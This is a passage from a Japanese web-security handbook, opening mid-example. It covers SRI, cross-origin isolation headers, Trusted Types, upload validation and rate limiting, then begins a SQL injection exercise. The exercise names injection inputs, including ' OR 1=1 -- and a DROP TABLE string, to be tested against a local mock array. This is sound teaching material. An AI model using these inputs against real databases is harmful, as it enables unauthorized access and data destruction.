  crossorigin="anonymous"></script>
```

ブラウザは:
1. ファイルをダウンロード
2. SHA-384 ハッシュを計算
3. `integrity` 属性と比較
4. 一致しなければ実行を拒否

これで「**CDN が改ざんされても、攻撃コードが実行されない**」保証ができる。

#### ハッシュの生成

```bash
# OpenSSL で
openssl dgst -sha384 -binary jquery.min.js | openssl base64 -A

# または
curl -s https://cdn.example.com/jquery.min.js | openssl dgst -sha384 -binary | openssl base64 -A
```

#### 自社配信ファイルにも SRI

ビルドツール (Webpack、Vite) に SRI プラグインを入れると、生成された JavaScript/CSS に自動で `integrity` 属性を付けてくれる。Cloudflare などの CDN 配信でも一段の保護になる。

```js
// vite.config.js
import { sri } from 'vite-plugin-sri3';
export default { plugins: [sri()] };
```

<a id="section-23-24"></a>
### 23.24 COOP / COEP / CORP ― クロスオリジンの新世代制限
<!-- handbook:learning {"level":"advanced","minutes":10} -->
<!-- handbook:index {"group":"C","term":"COEP (Cross-Origin-Embedder-Policy)"} -->
<!-- handbook:index {"group":"C","term":"COOP (Cross-Origin-Opener-Policy)"} -->
<!-- handbook:index {"group":"C","term":"CORP (Cross-Origin-Resource-Policy)"} -->

<!-- handbook:narrative-bridge {"section":"23.24"} -->
SRIは個々のファイルを検証するが、別オリジンの文書やリソースが同じプロセスや閲覧コンテキストへ影響する問題は残る。COOP、COEP、CORPは、オリジン間の共有と埋め込みを明示的に制限する。

伝統的に「**同一オリジンポリシー**」がブラウザのセキュリティ基盤だが、Spectre 攻撃 (2018年1月に公表された、CPU の投機的実行を悪用するサイドチャネル攻撃) 以降、より厳格な制限が必要になった。それが COOP / COEP / CORP。

#### COOP (Cross-Origin-Opener-Policy)

「**別オリジンの window.opener を切断**」する。

```text
Cross-Origin-Opener-Policy: same-origin
```

- `unsafe-none` (デフォルト): 制限なし
- `same-origin-allow-popups`: 自分が開いたポップアップは保持、他は切断
- `same-origin`: 厳格

これで「攻撃サイトが自社サイトを `window.open` してから操作する」攻撃が防げる。

#### COEP (Cross-Origin-Embedder-Policy)

「**自オリジンが埋め込むリソース (画像、iframe等) は明示的に許可されたものだけ**」を要求。

```text
Cross-Origin-Embedder-Policy: require-corp
```

これを設定すると、`<img src="https://other.example.com/a.png">` のような単純な埋め込みも、相手側が CORP ヘッダを返さない限り読めなくなる。

#### CORP (Cross-Origin-Resource-Policy)

リソース提供側が「**このリソースは誰に提供してよいか**」を宣言する。

```text
Cross-Origin-Resource-Policy: cross-origin
```

- `same-site`: 同一サイト内のみ
- `same-origin`: 同一オリジンのみ
- `cross-origin`: 全オリジン許可

#### 何のために必要か

COOP + COEP + HTTPS の3つが揃うと、ブラウザが **Cross-Origin Isolated** 状態になり、以下の強力な API が使える:

- **SharedArrayBuffer** (Wasm マルチスレッド)
- **performance.measureUserAgentSpecificMemory**
- **高精度 timer**

WASM で高性能アプリ (Figma、Photoshop Web 等) を作るには必須。

<a id="section-23-25"></a>
### 23.25 CSP Trusted Types ― XSS 防御の最終形
<!-- handbook:learning {"level":"advanced","minutes":5} -->
<!-- handbook:index {"group":"C","term":"CSP (Content Security Policy)"} -->
<!-- handbook:index {"group":"T","term":"Trusted Types (CSP)"} -->

<!-- handbook:narrative-bridge {"section":"23.25"} -->
オリジン分離を強めても、アプリケーション自身が文字列を危険なDOM APIへ渡せばXSSの入口は残る。Trusted Typesは、危険なsinkへ渡せる値をポリシーで生成された型に限定する。

23.3 で CSP を扱ったが、CSP の最新拡張 **Trusted Types** [W3C Trusted Types] は「**XSS を構造的に不可能にする**」アプローチ。

#### 現状の問題

CSP の `script-src` で外部スクリプトを制限しても、`innerHTML = userInput` のような**DOM XSS** は防げない。コード内部でユーザー入力を信頼してしまっている。

#### Trusted Types の仕組み

「**危険な DOM API は Trusted Type オブジェクトでないと受け付けない**」と強制する。

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default
```

```typescript
// BAD: 直接代入は拒否される
element.innerHTML = userInput;  // TypeError!

// GOOD: 必ず Trusted Type を経由
const policy = trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
});

element.innerHTML = policy.createHTML(userInput);  // OK、サニタイズ済み
```

「危険な操作は1箇所に集中」→ レビューで全 XSS リスクを潰せる。

#### 大規模アプリでの導入

Google が 2020 年に内部で導入し、社内 XSS 報告がほぼゼロに [Trusted Types at Google, 2020]。導入には時間がかかるが、長期的な投資として最強の XSS 対策。

- **Report-Only モード**で違反箇所をログ収集
- 違反を順次修正
- 完全準拠後に強制モードへ

<a id="section-23-26"></a>
### 23.26 アップロードされたファイルの検証 ― MIME偽装、サイズ制限、スキャン
<!-- handbook:learning {"level":"practical","minutes":25} -->
<!-- handbook:index {"group":"M","term":"MIME 偽装"} -->
<!-- handbook:index {"group":"は行","term":"ポリグロットファイル"} -->
<!-- handbook:index {"group":"あ行","term":"圧縮爆弾"} -->
<!-- handbook:index {"group":"ま行","term":"マジックバイト検査"} -->
<!-- handbook:index {"group":"か行","term":"検疫 (アップロード)"} -->

<!-- handbook:narrative-bridge {"section":"23.26"} -->
23.2 から 23.8 で扱った脆弱性は、いずれも「クライアントが送ってきた値を信じた」ことに帰着した。アップロードされたファイルは、その値が数MBのバイト列になっただけである。ただし、保管され、別のプログラムで解析され、あとで誰かのブラウザへ配信されるという3つの寿命を持つ点が違う。本節では、12.13 と 12.14 で受け取ったバイト列を、どこまで確かめてから受理するかを扱う。

ファイルのアップロードは、攻撃者から見ると**任意のバイト列を自分たちのインフラへ永続化させる機能**である。危険が生まれる場所は3か所あり、それぞれ対策が違う。

| 段階 | 何が起きるか | 主な対策 |
|---|---|---|
| 受理時 | 想定外の種別・大きさが入る | 種別と大きさの判定、上限、テナント境界 |
| 処理時 | 画像・文書のパーサが攻撃される | 隔離実行、資源上限、展開比の制限、スキャン |
| 配信時 | 保存したバイト列が他人のブラウザで実行される | オリジン分離、`Content-Disposition`、`nosniff` |

このうち配信時の危険が最も見落とされる。受理も処理も無事に終わったファイルが、数か月後に別の機能から配信されて XSS になる、という時間差が生じるためである。

#### 申告された種別は3つとも信用できない

クライアントが伝えてくる種別の手掛かりは3つあるが、いずれも攻撃者が自由に決められる。

- `Content-Type` ヘッダ (`multipart/form-data` のパートヘッダを含む)
- ファイル名の拡張子
- 署名付きURL発行時に申告した種別 (12.13)

したがって、受理の判断は**実際のバイト列**から行う。ファイル形式の多くは先頭に固有のバイト列 (マジックバイト) を持つ。

```typescript
const SIGNATURES: Array<{ type: string; offset: number; magic: number[] }> = [
  { type: 'image/png',       offset: 0, magic: [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a] },
  { type: 'image/jpeg',      offset: 0, magic: [0xff, 0xd8, 0xff] },
  { type: 'application/pdf', offset: 0, magic: [0x25, 0x50, 0x44, 0x46, 0x2d] },  // "%PDF-"
  { type: 'application/zip', offset: 0, magic: [0x50, 0x4b, 0x03, 0x04] },        // docx/xlsx も
];

export function sniff(head: Buffer): string | null {
  for (const s of SIGNATURES) {
    const slice = head.subarray(s.offset, s.offset + s.magic.length);
    if (slice.length === s.magic.length && s.magic.every((b, i) => slice[i] === b)) return s.type;
  }
  return null;
}

export function accept(declared: string, filename: string, head: Buffer): Decision {
  const detected = sniff(head);
  // 1. 検出できない種別は受け付けない (許可リスト方式)
  if (!detected || !ALLOWED.has(detected)) return { ok: false, reason: 'unsupported type' };
  // 2. 申告と実体が食い違うものは、たとえ両方が許可種別でも拒否する
  if (detected !== declared) return { ok: false, reason: 'declared type mismatch' };
  // 3. 拡張子は検出結果から決め直す。クライアント由来の値は使わない
  return { ok: true, type: detected, extension: EXTENSION_OF[detected] };
}
```

2番目の判定を入れる理由は、食い違いそのものが異常の合図だからである。正当な利用者のブラウザは、`Content-Type` と中身をまず一致させる。

マジックバイトの検査には限界もある。

- **ポリグロット**: 複数の形式として同時に妥当なファイルを作れる。GIF のヘッダで始まりながら、後半が有効な HTML や JavaScript であるファイルは古くから知られている。マジックバイトの検査は通る。
- **テキスト形式**: SVG、HTML、CSV、SVGを内包する Office 文書には固定のマジックバイトが無い、あるいは ZIP と区別できない。SVG は XML であり、`<script>` や `onload` を書ける。**画像として扱ってはならない。**
- **中身の妥当性は別問題**: マジックバイトが合っていても、そのあとが壊れたデータであれば、解析するライブラリが攻撃を受ける。

したがってマジックバイト検査は「最低限の関門」であって、これだけで安全にはならない。決定的なのは、**受理した種別ごとに、その後の扱いを固定すること**である。画像は再エンコードし、PDF は隔離環境で解析し、SVG は原則として受け付けないか、受け付けるなら別オリジンから `attachment` としてのみ配信する。

#### サイズ制限は層ごとに、そして展開後にも

「上限100MB」は、それを強制する場所が無ければ存在しない。少なくとも4か所に同じ値を置く。

| 層 | 効果 | 注意 |
|---|---|---|
| クライアント | 体験の改善のみ | 防御にはならない |
| リバースプロキシ / WAF | アプリへ到達させない | ここが最初の実効的な上限 |
| アプリのパーサ | ストリームの途中で打ち切る | 読み切ってからの判定は無意味 |
| 署名条件 (12.13) | 直接アップロードの唯一の上限 | ここが抜けると他の3つが迂回される |

これらとは別に、**展開後のサイズ**の制限が要る。圧縮爆弾は、小さな圧縮ファイルが展開時に膨大なサイズになる古典的な攻撃で、数十KBのファイルがギガバイト級に膨らむ。ZIP、gzip、そして ZIP を内部形式とする Office 文書のすべてが対象になる。

```typescript
const MAX_EXPANDED_BYTES = 200 * 1024 * 1024;
const MAX_RATIO = 100;             // 圧縮比の上限
const MAX_ENTRIES = 2_000;
const MAX_DEPTH = 2;               // 入れ子の展開段数

export async function* safeExpand(entry: ArchiveEntry, ctx: { depth: number; compressed: number }) {
  if (ctx.depth > MAX_DEPTH) throw new RejectedError('nested archive too deep');
  let written = 0;
  for await (const chunk of entry.stream()) {
    written += chunk.byteLength;
    // 展開しながら判定する。宣言された展開後サイズは信用しない。
    if (written > MAX_EXPANDED_BYTES) throw new RejectedError('expanded size limit');
    if (written / Math.max(1, ctx.compressed) > MAX_RATIO) throw new RejectedError('compression ratio');
    yield chunk;
  }
}
```

要点は**展開しながら数えること**にある。アーカイブのヘッダに書かれた展開後サイズは、攻撃者が自由に書ける値であり、検査の根拠にならない。エントリ数と入れ子の深さにも上限を置く。1エントリずつは小さくても、数十万エントリあれば同じ効果になる。

#### 処理は隔離して、資源に上限を置く

画像・動画・PDF・Office 文書のパーサは、C や C++ で書かれた歴史の長いライブラリであることが多く、脆弱性が繰り返し見つかっている。**攻撃者が選んだバイト列を、自分たちのアプリケーションと同じプロセスで解析するのは避ける。**

- 変換処理は専用のワーカーで行い、そのプロセスの権限を最小にする。ネットワークへの出口を塞ぎ、書き込み先を一時領域に限る。
- CPU 時間、メモリ、出力サイズ、実行時間に上限を設ける。無限ループや資源枯渇は「壊れたファイル」でも起きる。
- 変換ライブラリの更新を、23.10 の依存パッケージ管理に含める。この領域の脆弱性は頻繁に更新される。
- 画像は**再エンコードする**。元のバイト列を配信せず、自分たちで書き出し直したものを配信すれば、埋め込まれたスクリプトや細工されたチャンクは残らない。同時に EXIF の位置情報も落ちる。

#### ウイルススキャンの位置づけ

スキャンは有用だが、**何ができないか**を理解して置く必要がある。

- できるのは、既知の検体との照合である。新しい検体や、その組織だけを狙って作られたファイルは検出されない。
- 暗号化されたアーカイブの中身は見えない。パスワード付きZIPは、スキャンを通り抜ける定番の手段である。
- スキャン自体がファイルを解析するため、スキャナのパーサにも脆弱性がありうる。
- 定義ファイルは更新される。**受理時に問題なしと判定されたファイルも、後から検体として認識されうる**。重要な領域では定期的な再スキャンを行う。

したがってスキャンは「これを通れば安全」ではなく、「明らかに既知の悪意あるものを早く落とす」ための層として扱う。配置は、受理してから配信可能になるまでの検疫期間の中に置く。

```text
UPLOADED ──> SCANNING ──> READY        (配信可能)
                 │
                 └─────> QUARANTINED   (隔離。所有者へ通知し、配信も再取得も不可)
```

`SCANNING` の状態にあるファイルを配信してはならない。「スキャンは非同期だから、その間は配信を許す」という設計は、検疫の意味を失わせる。

#### 配信時の防御

保存に成功したファイルは、いつか誰かのブラウザに届く。ここで最後の関門を置く。

```text
Content-Type: application/octet-stream        ← 検出した種別を使う。申告値は使わない
Content-Disposition: attachment; filename*=UTF-8''%E8%AB%8B%E6%B1%82%E6%9B%B8.pdf
X-Content-Type-Options: nosniff               ← ブラウザによる推測を止める
Content-Security-Policy: sandbox; default-src 'none'
Cross-Origin-Resource-Policy: same-site
```

- **別オリジンから配信する。** 利用者コンテンツを `app.example.com` から配信すると、そこで実行されたスクリプトは同一オリジンのセッションを扱えてしまう。`usercontent-example.net` のように、Cookie を共有しない別サイトへ置く。これは 23.24 のクロスオリジン制限と同じ目的を、より根本的な形で達成する。
- **`nosniff` を必ず付ける。** これがないと、ブラウザは中身から種別を推測し、`text/plain` として送ったつもりのファイルを HTML として描画しうる。
- **インライン表示は種別ごとに明示的に許可する。** デフォルトを `attachment` にし、画像など安全が確認できた種別だけを `inline` にする。SVG はデフォルト側に置く。
- **ファイル名はヘッダで安全に符号化する。** 生の名前をそのまま入れると、改行や引用符でヘッダを分断される。

#### 保存名とパスの扱い

- 保存キーはサーバで生成する (12.13)。元のファイル名は表示用の列に持つ。
- 表示用の名前も、そのまま画面へ出せば XSS の入力になる。23.3 のエスケープを適用する。
- パスを組み立てる箇所では、正規化した結果が意図した接頭辞の下にあることを確認する。`..` はパーセント符号化や Unicode の正規化を経て復活しうる。
- テナントの識別子を接頭辞に含め、署名条件でも縛る (13.24)。これがないと、ファイルの取り違えが即座に情報漏洩になる。

#### つまずく箇所 ― アップロードの検証

- **拡張子の許可リストだけで判定する**: `report.pdf.svg` のような多重拡張子、大文字小文字、末尾の空白やドット、Unicode の見た目が似た文字で回避される。実体から種別を決める。
- **画像を再エンコードせずに配信する**: 元のバイト列には、解析器を狙う細工と位置情報の両方が残る。書き出し直すだけで大半が消える。
- **スキャンを唯一の防御にする**: 未知の検体、暗号化アーカイブ、後から検体になるファイルには効かない。層の1つとして扱う。
- **展開後サイズを宣言値で確かめる**: アーカイブのヘッダは攻撃者が書ける。展開しながら数える。
- **利用者コンテンツを本体と同じオリジンから配信する**: 1つの見落としが、セッションを奪える XSS に直結する。オリジンを分けておけば、被害はそのファイルの閲覧者に限定される。
- **検疫中のファイルを配信する**: 非同期処理の途中を「まだ処理中だが取得はできる」状態にすると、検疫は形だけになる。

<a id="section-23-27"></a>
### 23.27 自動化された脅威 ― bot、スパム、レート制限の設計
<!-- handbook:learning {"level":"practical","minutes":25} -->
<!-- handbook:index {"group":"は行","term":"bot 対策"} -->
<!-- handbook:index {"group":"さ行","term":"スパム対策"} -->
<!-- handbook:index {"group":"ら行","term":"レート制限の設計"} -->
<!-- handbook:index {"group":"R","term":"Retry-After"} -->
<!-- handbook:index {"group":"C","term":"CAPTCHA"} -->

<!-- handbook:narrative-bridge {"section":"23.27"} -->
23.2 から 23.26 で扱ってきた脆弱性は、いずれも「1回の要求で境界を越えられる」種類のものだった。本節が扱うのは性質が違う。個々の要求はどれも正当で、境界も越えていない。問題は**回数**である。1回なら正常な操作が、毎秒1000回になると、資源の枯渇、他人の資格情報の探索、スパムの投稿、在庫の買い占めになる。13.25 が認証エンドポイントに絞って扱った内容を、ここでは公開されているすべての経路へ広げる。

自動化された要求への対処は、単一の技術ではなく判断の積み重ねである。OWASP が整理している自動化された脅威の一覧 [OWASP ATP] は、この領域の語彙として役に立つ。資格情報の探索、在庫の買い占め、価格の収集、コンテンツの大量取得、偽アカウントの作成、といった行為に名前が付いており、**自分たちのサービスがどれの対象になるか**を洗い出す出発点になる。

#### bot は悪ではない ― 分けるのは「意図」である

「bot を止める」という言い方は、実装の指針にならない。自分たちのサイトへ来る自動化された要求には、止めてはならないものが多く含まれる。

| 種別 | 例 | 扱い |
|---|---|---|
| 歓迎する | 検索エンジン、SNS のプレビュー生成、外形監視 | 通す。`robots.txt` で範囲を伝える |
| 契約している | 自社のモバイルアプリ、公開APIの利用者、連携先 | 認証して識別し、契約に応じた上限を割り当てる |
| 許容する | 個人の学習用スクリプト、控えめな収集 | 上限内なら通す |
| 止めたい | 資格情報の探索、在庫の買い占め、大量の投稿、内容の一括取得 | 段階的に費用を上げ、最終的に拒否する |

したがって、対処の第一歩は**識別**である。認証済みの要求は主体が分かるため、上限を主体に紐づけられる。問題になるのは、認証を要求できない経路 ― 登録、ログイン、パスワード再設定、問い合わせ、検索、公開ページ、在庫や価格の参照 ― である。

`robots.txt` は約束であって強制力ではない。従う相手にだけ効く。**`robots.txt` に書いたから守られる、という前提を置かない。** 逆に、隠したい経路を `robots.txt` に列挙すると、それ自体が地図になる。

#### 判定は3段階で組む

自動化された要求かどうかの判定は、確実な単一の指標が存在しない。段階を重ねる。

**1. 静的な合図。** `User-Agent`、送信元IPの素性、TLS の握手の特徴、要求ヘッダの並び。いずれも偽装できるため、**これだけで拒否しない**。特に `User-Agent` は自己申告であり、判定の根拠として弱い。「検索エンジンを名乗るIPが、その事業者のものか」を逆引きで確認する程度には使える。

**2. 振る舞い。** 単位時間あたりの要求数、経路の遷移の仕方、資源の取得の有無 (HTML だけを取得して画像もCSSも取らない)、入力の速さ、同じ入力の繰り返し。これらは偽装の費用が上がるため、静的な合図より有効である。ただし、正規利用者の中にも異常に見える人はいる (支援技術の利用者、低速な回線、企業のプロキシ配下)。**振る舞いだけで拒否しない。**

**3. チャレンジ。** 判定が疑わしい場合にだけ、追加の作業を求める。ここで初めて拒否に近い扱いをする。

この順序が重要である。すべての利用者にチャレンジを課す設計は、正規利用者の離脱と、次に述べるアクセシビリティの問題を招く。

#### チャレンジの費用を理解して選ぶ

| 方式 | 攻撃者への効果 | 利用者への負担 |
|---|---|---|
| 隠しフィールド (honeypot) | 単純な自動投稿には有効。学習されると効かない | ほぼ無い。ただし自動入力が値を入れると誤判定する |
| 送信までの時間の検査 | 単純な自動投稿に有効 | ほぼ無い。読み込みに時間がかかる利用者を弾かないよう下限だけにする |
| 計算量を課す (Proof of Work) | 大量試行の費用が上がる | 端末性能に依存する。低性能な端末ほど重い |
| 画像・音声の判読 | 有効だが、突破する手段が広く存在する | **大きい。視覚・聴覚・認知の特性によっては通過できない** |
| 事業者提供の判定サービス | 実績があり運用も委ねられる | 第三者へ利用者の情報が渡る。プライバシー上の判断が要る |
| 追加要素の要求 (既存利用者) | 資格情報だけを持つ攻撃者を止められる | 中程度。既存利用者に限られる |

**画像判読型の CAPTCHA は、アクセシビリティの観点で深刻な問題を抱える。** 視覚に障害のある利用者、認知特性によって図形の判別が難しい利用者、そして支援技術を使う利用者にとって、代替手段が用意されていなければ**そこでサービスの利用が完全に止まる**。音声版を用意しても、聴覚に困難がある場合や騒音下では機能しない。6.9 で扱ったとおり、これは「一部の利用者が使いにくい」ではなく「使えない」に該当しうる。

したがって、次を守る。

- **常時ではなく、疑わしいときだけ出す。**
- **必ず代替手段を用意する。** 別の方式のチャレンジ、あるいは人による対応窓口。
- **突破できなかった利用者を計測する。** 何割が離脱しているかを知らずに運用しない。
- **アクセシビリティの検証対象に含める。** 25.11 のキーボード走査と読み上げ確認を、チャレンジの画面にも適用する。

#### スパムは「投稿の質」ではなく「投稿の経路」で減らす

コメント、レビュー、問い合わせ、招待、プロフィールなど、利用者が文章を入れられる場所はすべてスパムの対象になる。内容から判定する仕組み (分類器、禁止語) は必要だが、それだけに頼ると誤判定と回避のいたちごっこになる。経路の側で費用を上げるほうが効く。

- **投稿できる主体を絞る。** メールアドレスの確認済み、登録から一定時間経過、一定の操作履歴がある、といった条件を段階的に置く。
- **速度を制限する。** 「1分に1件」「1日に20件」。上限に達したことを利用者へ明示する。
- **外部リンクの扱いを決める。** 新規利用者の投稿ではリンクを無効化する、`rel="nofollow ugc"` を付ける、審査に回す。スパムの目的の多くはリンクの設置である。
- **審査の待ち行列を作る。** 疑わしいものを即座に拒否せず、保留する。誤判定を人が救済できる経路が要る。
- **通報の経路を用意する。** 自動判定が拾えないものは、利用者のほうが早く見つける。
- **登録そのものを制限する。** 使い捨てメールアドレスの扱い、同一送信元からの大量登録、招待制。

メールを送る機能 (17.14) を持つ場合、スパムの投稿は**自分たちの送信ドメインの評判**に直結する。通知メールが第三者へのスパム送信に使われると、正規のメールまで届かなくなる。「誰が、誰宛に、どれだけ送れるか」を機能ごとに決める。

#### レート制限は、鍵・層・返し方の3つを決める

レート制限のアルゴリズム (トークンバケット、スライディングウィンドウ) そのものは 14.22 と課題23.5 で扱っている。ここで決めるのは、その周りの3つである。

**1. 何を鍵にするか。** IPアドレスだけを鍵にすると、13.25 で見たとおり2方向に外れる。共有IP (企業のプロキシ、モバイルキャリアのNAT、大学) の配下では大勢の正規利用者が1つの鍵を共有し、逆に送信元を分散させた攻撃には効かない。

| 鍵 | 使いどころ | 弱点 |
|---|---|---|
| APIキー・利用者ID | 認証済みの経路。最も正確 | 未認証の経路では使えない |
| テナント・組織 | SaaS の資源配分 (14.22) | 個人の暴走を捉えない |
| IPアドレス | 未認証経路の第一候補 | 共有IPと分散攻撃の両方に弱い |
| ネットワークブロック | IPを分散させた攻撃 | 巻き添えの範囲が広がる |
| 操作の種類ごとの合計 | 高価な操作の保護 | 鍵ではなく上限の分け方の話 |

実務では**複数を同時に**適用し、最も厳しいものが効く形にする。あわせて、14.22 のように**操作ごとに重みを変える**。一覧の取得と全文検索とエクスポートを同じ1回として数えると、重い操作を選んで叩かれたときに守れない。

**2. どの層に置くか。**

| 層 | 効果 | 限界 |
|---|---|---|
| CDN・エッジ | アプリへ到達させない。最も安い | 利用者やテナントを識別しにくい |
| リバースプロキシ・ゲートウェイ (20.12) | 経路単位で一律に効く | 業務的な文脈を持たない |
| アプリケーション | 主体・操作・重みを反映できる | ここへ到達した時点で資源を消費している |
| データベース・下流 | 最後の砦 (14.22、26.11) | ここで詰まると全体が止まる |

**上流ほど安く、下流ほど正確である。** 両方に置く。アプリケーションだけに置くと、そこへ到達するまでの資源 (接続、TLS 握手、パース) は消費されてしまう。

**3. どう返すか。** 制限にかかったことは、正しく伝えなければクライアントは適切に振る舞えない。

```text
HTTP/1.1 429 Too Many Requests
Retry-After: 30
Content-Type: application/problem+json

{"type":"https://example.com/probs/rate-limit","title":"Too Many Requests",
 "status":429,"detail":"組織単位の上限 (100 req/min) を超えました","retryAfterSeconds":30}
```

- **`429` を使う** [RFC 6585]。`403` や `500` を返すと、クライアントはリトライしてよいのか分からない。
- **`Retry-After` を付ける。** 17.15 で見たとおり、まともなクライアントはこれを尊重する。付けなければ、即座にリトライされ、状況が悪化する。
- **応答本文は 12.5 の形式に揃える。** 何の上限に、どの単位で当たったかを書く。「レート制限です」だけでは、利用者は何を直せばよいか分からない。
- **上限の残りをヘッダで伝えるかを決める。** 残数を返すと、クライアントは事前に調整できる。一方、攻撃者にはしきい値を教えることになる。公開APIでは返し、未認証の経路では返さない、という使い分けが取られることが多い。
- **制限の応答を安く作る。** 429 を返すためにDBを引く実装では、攻撃時にDBが落ちる。判定はメモリまたは近接するキャッシュで完結させる。

#### 拒否したことと、拒否しすぎたことの両方を測る

レート制限とbot対策は、**入れたあとに調整しなければ必ず外れる**。運用に必要な指標は2種類ある。

- **拒否の側**: 429 の件数、鍵の種別ごとの内訳、チャレンジの発生数と突破率、失敗率の全体推移。
- **巻き添えの側**: 制限にかかった認証済み利用者の数、チャレンジで離脱した割合、問い合わせの件数。

後者を見ずに前者だけを見ると、しきい値は際限なく厳しくなる。**正規利用者を1人も巻き込まない設定は存在しない**ため、どこまで許容するかを決めて監視する。

導入時は、**まず記録だけを行い、拒否はしない** (検知モード)。実データでしきい値の妥当性を確認してから拒否へ切り替える。WAF のような汎用のルールセットを入れる場合も同じで、デフォルトのルールをいきなり有効にすると、正規の入力 (技術文書の投稿、SQLを含む問い合わせ) が弾かれる。

分散環境では、カウンタの共有が問題になる。プロセス内のカウンタは、インスタンス数を掛けた分だけ実効上限が緩む (課題23.5 の警告が指摘している)。共有ストア (15.2) を使うか、上限を台数で割る近似を使う。**近似で足りるかどうかは、守っている対象で決まる。** 資源の保護なら多少の誤差は許容できるが、認証試行の制限では甘く見積もると意味が薄れる。

#### 大量の要求そのものへの備え

帯域や接続を飽和させる規模の攻撃は、アプリケーションの実装では対処できない。上流の事業者 (CDN、クラウドの保護サービス、回線事業者) に委ねる領域である。アプリケーション側で用意しておくのは次の2点である。

- **オリジンを直接叩かれない構成。** CDN を経由する前提なら、オリジンのIPを公開せず、CDN からの経路だけを受け付ける。
- **過負荷時の縮退。** 26.11 の負荷制限と優先度付けを実装し、重要な機能 (決済、認証) を守る。「全部が等しく遅くなる」より「重要でないものから落とす」ほうが被害が小さい。

#### つまずく箇所 ― 自動化された脅威

- **「bot を止める」を目標にする**: 止めてはならない自動化された要求が多数ある。意図で分け、識別を先に置く。
- **`User-Agent` で判定する**: 自己申告であり、簡単に偽装される。振る舞いと組み合わせる。
- **CAPTCHA を全員に常時出す**: 一部の利用者はそこで完全に利用できなくなる。疑わしいときだけ出し、代替手段を用意し、突破率を測る。
- **IPアドレスだけを鍵にする**: 共有IP配下の正規利用者を巻き込みつつ、分散した攻撃には効かない。複数の鍵を重ねる。
- **すべての操作を同じ1回として数える**: 重い操作を選んで叩かれると守れない。重みを付ける (14.22)。
- **アプリケーション層にだけ置く**: そこへ到達するまでの資源は消費される。上流にも置く。
- **`429` と `Retry-After` を返さない**: クライアントが即座にリトライし、状況が悪化する。
- **拒否の件数だけを見る**: 巻き添えを測らないと、しきい値は際限なく厳しくなる。
- **検知モードを経ずに拒否から始める**: 正規の入力が弾かれ、原因の切り分けができないまま切り戻すことになる。
- **プロセス内カウンタで認証試行を制限する**: 台数分だけ実効上限が緩む。共有ストアを使う。

<a id="section-23-28"></a>
### 23.28 実装課題 ― セキュリティを攻撃と防御の両面で学ぶ
<!-- handbook:learning {"level":"practical","minutes":600} -->

<!-- handbook:narrative-bridge {"section":"23.28"} -->
ここまでの防御は、名前を知るだけでは運用できない。実装課題では、隔離環境で攻撃を再現し、防御後に何が検出・拒否・軽減されたかを観測して、信頼境界と実装を対応付ける。

第23章では OWASP Top 10、CSRF / XSS / SQLi / SSRF / IDOR、シークレット管理、Merkle Tree、TLS、PQC、Trusted Types を見た。本節では各攻撃を「攻撃側コード」と「防御側コード」の両方で書き、Web 開発者が日々戦っている脅威を体感する。所要時間: 演習カードの推定時間の合計で19時間。

#### 課題23.1: SQL インジェクション ― 実演と防御 (★★)

**目的**: 脆弱な実装が文字列連結でクエリを組み立てる場合、どう破られるかを実演。

<!-- handbook:exercise:start {"id":"23.1"} -->
> **演習カード 課題23.1** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 23.2 SQLインジェクション を読み、文字列連結とプレースホルダでSQLの構文木がどう変わるかを説明できる
> - 23.1 OWASP Top 10 (2021) を読み、インジェクションが占める位置を確認する
> - code/ch23 で pnpm install が完了し、`pnpm --filter @handbook/ch23 run test` が実行できる
> - Node.js と TypeScript で正規表現によるSQL文字列の簡易評価関数を書ける
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] unsafeQuery("' OR 1=1 --") が SELECT id, name FROM users WHERE name = '' OR 1=1 --' という連結済み文字列を返す
> - [ ] safeQuery(input) が sql と params の2キーを返し、sql 側に入力文字列が一切現れない
> - [ ] demonstrateAttack("' OR 1=1 --") の badResult が2件、goodResult が0件になる
> - [ ] '; DROP TABLE users; --' を渡すと bad 側だけが users table dropped by injected statement という例外メッセージを返す
> - [ ] 実データベースへ接続せず、テストデータ配列 alice と bob だけを対象に攻撃入力を評価している
>
> **期待出力**
>
> - demonstrateAttack() が unsafeSql と badResult と safe と goodResult の4キーを持つオブジェクトを返す
> - 'OR 1=1' 入力で bad 側は2レコード配列、good 側は空配列という対比が同一実行で出力される
> - DROP TABLE 入力では badResult が文字列のエラーメッセージ、goodResult が空配列になる
>
> **観察項目**
>
> - unsafeSql の文字列を目視し、入力のシングルクォートが直前のリテラルを閉じ、`--` 以降が構文的にコメント化される位置を特定する
> - safeQuery() の sql が入力内容に関わらず SELECT id, name FROM users WHERE name = ? のまま変化しないことを確認する
> - 攻撃文字列が params[0] に生の値のまま入り、値としてしか比較されない信頼境界を確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch23 exec tsx --test --test-name-pattern="SQL injection" solutions.test.ts` を実行し、1件がpassすれば合格
> 2. `pnpm --filter @handbook/ch23 run test` を実行し、solutions.test.ts のテストがすべてpassすることを確認する
> 3. 自作実装で demonstrateAttack('bob') を呼び、bad と good の双方が bob 1件だけを返せば正常系を壊していないと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 先に攻撃入力なしの正常系で bad と good が同じ1件を返す状態を作り、その後で `' OR 1=1 --` を入れて結果件数の差が出る形にする
> 2. **構造**: unsafeQuery() はテンプレートリテラルで連結、safeQuery() は sql と params に分けたオブジェクトを返す。bad 側の「実行」は実DBではなく、生成されたSQL文字列を正規表現で判定する擬似評価関数にする
> 3. **実装の要点**: 攻撃判定は大文字小文字と空白の揺れを吸収する必要があるため /\bor\s+1\s*=\s*1\b/i のように i フラグと \s* を入れる。DROP TABLE 側は結果を返さず throw して破壊性を結果の型の違いとして表現する
>
> **本番利用時の警告**
>
> - 攻撃文字列の投入先はこの教材のローカル配列に限定する。実運用DBや第三者が管理するホストへ同じ入力を送ると不正アクセスにあたる
> - simulateUnsafe() は正規表現による擬似評価であり実SQLパーサではない。UNION SELECT、時間差ブラインド、スタッククエリ、二次注入は再現されず、この演習を通過しても注入耐性の証明にはならない
> - safeQuery() のプレースホルダが守るのは値だけである。テーブル名・カラム名・ORDER BY 方向を動的に組み立てる箇所は連結が残るため、許可リストによる別防御が必要になる
>
> **導線**
>
